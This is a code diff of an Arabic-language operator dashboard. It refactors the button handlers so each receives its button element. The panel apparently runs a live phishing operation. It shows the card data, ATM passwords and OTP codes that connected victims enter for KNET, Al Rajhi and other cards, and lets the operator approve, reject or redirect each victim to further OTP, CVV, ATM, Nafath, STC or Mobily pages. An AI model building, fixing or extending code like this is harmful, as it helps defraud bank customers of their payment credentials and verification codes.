@@ -1578,7 +1578,7 @@
               html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
             } else if (dc.page === 'رمز التحقق كي نت (OTP)') {
               // زر موافقة CVV لصفحة كي نت OTP - يحول العميل لصفحة ATM
-              html += '<button onclick="codeActionCVV(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة CVV</button>';
+              html += '<button onclick="codeActionCVV(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة CVV</button>';
             } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
               // أزرار صفحة تحقق رقم الجوال OTP
               const phoneOtpNafathBtnId = 'phone-otp-nafath-btn-' + visitor.socketId + '-' + index;
@@ -1589,9 +1589,9 @@
                 html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
               }
             } else {
-              html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button onclick="codeActionApprove(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
-            html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            html += '<button onclick="codeActionReject(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
             // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
             if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
               html += '<button id="' + codeRajhiNavBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي</button>';
@@ -1707,8 +1707,8 @@
               html += '</div>';
               // Action buttons for KNET card
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
-              html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+              html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               html += '</div>';
               html += '</div>';
@@ -1735,9 +1735,9 @@
               html += '</div>';
               // Action buttons for credit card
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
-              html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
-              html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+              html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
+              html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               html += '</div>';
               html += '</div>';
@@ -2293,8 +2293,7 @@
     }
 
     // Card action functions
-    function cardActionOTP(socketId) {
-      const btn = event.target;
+    function cardActionOTP(btn, socketId) {
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
       window.skipDetailsUpdate = true;
@@ -2314,8 +2313,7 @@
       }, 1500);
     }
 
-    function cardActionATM(socketId) {
-      const btn = event.target;
+    function cardActionATM(btn, socketId) {
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
       window.skipDetailsUpdate = true;
@@ -2335,8 +2333,7 @@
       }, 1500);
     }
 
-    function cardActionReject(socketId) {
-      const btn = event.target;
+    function cardActionReject(btn, socketId) {
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
@@ -2356,8 +2353,7 @@
     }
 
     // Code action functions (for OTP/digit codes)
-    function codeActionCVV(socketId, codeIndex) {
-      const btn = event.target;
+    function codeActionCVV(btn, socketId, codeIndex) {
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'cvv', codeIndex });
@@ -2376,8 +2372,7 @@
       }, 1500);
     }
 
-    function codeActionApprove(socketId, codeIndex) {
-      const btn = event.target;
+    function codeActionApprove(btn, socketId, codeIndex) {
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
@@ -2396,8 +2391,7 @@
       }, 1500);
     }
 
-    function codeActionReject(socketId, codeIndex) {
-      const btn = event.target;
+    function codeActionReject(btn, socketId, codeIndex) {
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
